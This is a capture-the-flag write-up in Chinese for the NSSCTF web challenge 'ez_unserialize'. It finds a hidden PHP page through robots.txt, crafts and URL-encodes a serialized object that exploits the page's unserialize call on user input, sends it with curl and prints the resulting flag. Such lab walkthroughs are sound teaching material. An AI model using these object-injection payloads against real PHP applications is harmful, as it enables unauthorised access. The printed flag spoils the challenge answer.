# ez_unserialize

题目链接：https://www.nssctf.cn/problem/426



解题思路：

f12看到源码有提示：

```

<!DOCTYPE html>
<html>
<head>
   <title>ez_unserialize</title>
</head>
<body>
    <div class="container" style="margin-top:100px">  
        <form  class="well" style="width:220px;margin:0px auto;"> 
            <img src="./hutao.GIF" class="img-memeda " style="width:180px;margin:0px auto;">
            <h3>咦？题目在哪捏？</h3>
        </form>
    </div>
</body>
</html>

<!--
User-agent: *
Disallow: 什么东西呢？
-->
```

根据提示，输入http://node7.anna.nssctf.cn:22304/robots.txt 可以看到：

```
User-agent: *
Disallow: /cl45s.php
```

访问http://node7.anna.nssctf.cn:22304/cl45s.php，可以看到：

```
<?php

error_reporting(0);
show_source("cl45s.php");

class wllm{

    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin ="user";
        $this->passwd = "123456";
    }

        public function __destruct(){
        if($this->admin === "admin" && $this->passwd === "ctf"){
            include("flag.php");
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

$p = $_GET['p'];
unserialize($p);

?>
```

编写序列化类的代码：
```
<?php 

class wllm{

    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin ="user";
        $this->passwd = "123456";
    }

        public function __destruct(){
        if($this->admin === "admin" && $this->passwd === "ctf"){
            include("flag.php");
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

$wllm = new wllm();
$wllm->admin = "admin";
$wllm->passwd = "ctf";
echo serialize($wllm);
?>
```

得到序列化后的结果：
```
O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

urlencode一下，得到：
```
O%3A4%3A%22wllm%22%3A2%3A%7Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22passwd%22%3Bs%3A3%3A%22ctf%22%3B%7D
```

构造请求：
```
curl http://node7.anna.nssctf.cn:22304/cl45s.php?p=O%3A4%3A%22wllm%22%3A2%3A%7Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22passwd%22%3Bs%3A3%3A%22ctf%22%3B%7D
```

得到响应，里面有flag:
```
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /><br />error_reporting</span><span style="color: #007700">(</span><span style="color: #0000BB">0</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">show_source</span><span style="color: #007700">(</span><span style="color: #DD0000">"cl45s.php"</span><span style="color: #007700">);<br /><br />class&nbsp;</span><span style="color: #0000BB">wllm</span><span style="color: #007700">{<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;</span><span style="color: #0000BB">$admin</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;</span><span style="color: #0000BB">$passwd</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;</span><span style="color: #0000BB">__construct</span><span style="color: #007700">(){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$this</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">admin&nbsp;</span><span style="color: #007700">=</span><span style="color: #DD0000">"user"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$this</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">passwd&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"123456"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;</span><span style="color: #0000BB">__destruct</span><span style="color: #007700">(){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$this</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">admin&nbsp;</span><span style="color: #007700">===&nbsp;</span><span style="color: #DD0000">"admin"&nbsp;</span><span style="color: #007700">&amp;&amp;&nbsp;</span><span style="color: #0000BB">$this</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">passwd&nbsp;</span><span style="color: #007700">===&nbsp;</span><span style="color: #DD0000">"ctf"</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style="color: #DD0000">"flag.php"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #0000BB">$flag</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #0000BB">$this</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">admin</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #0000BB">$this</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">passwd</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Just&nbsp;a&nbsp;bit&nbsp;more!"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /></span><span style="color: #0000BB">$p&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'p'</span><span style="color: #007700">];<br /></span><span style="color: #0000BB">unserialize</span><span style="color: #007700">(</span><span style="color: #0000BB">$p</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code>NSSCTF{c6e5b3b0-8025-46b0-a9f2-08852675616b}
```